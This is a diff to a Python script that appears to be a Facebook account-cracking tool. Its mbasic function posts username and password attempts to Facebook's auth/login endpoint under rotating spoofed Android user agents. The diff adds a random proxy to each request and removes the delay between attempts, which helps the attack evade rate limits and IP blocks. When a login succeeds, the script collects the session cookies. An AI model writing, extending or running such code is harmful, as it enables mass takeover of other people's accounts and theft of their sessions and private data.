@@ -1296,6 +1296,8 @@ def mbasic(uid,pwx,tl):
             "[FBAN/FB4A;FBAV/355.0.0.44.118;FBBV/300182893;FBDM/{density=4.0,width=1080,height=2280};FBLC/ko_KR;FBRV/305000123;FBCR/SKT;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G970N;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
             "[FBAN/FB4A;FBAV/365.0.0.44.118;FBBV/310204222;FBDM/{density=3.0,width=1080,height=2400};FBLC/ru_RU;FBRV/315309999;FBCR/MegaFon;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Realme 7 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]"]
             random_user_agent = random.choice(user_agents)
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -1342,8 +1344,7 @@ def mbasic(uid,pwx,tl):
                 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
             }
             url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers).json()
-            time.sleep(0.5)
+            result = requests.post(url, data=data, headers=headers, allow_redirects=False, proxies=proxs).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
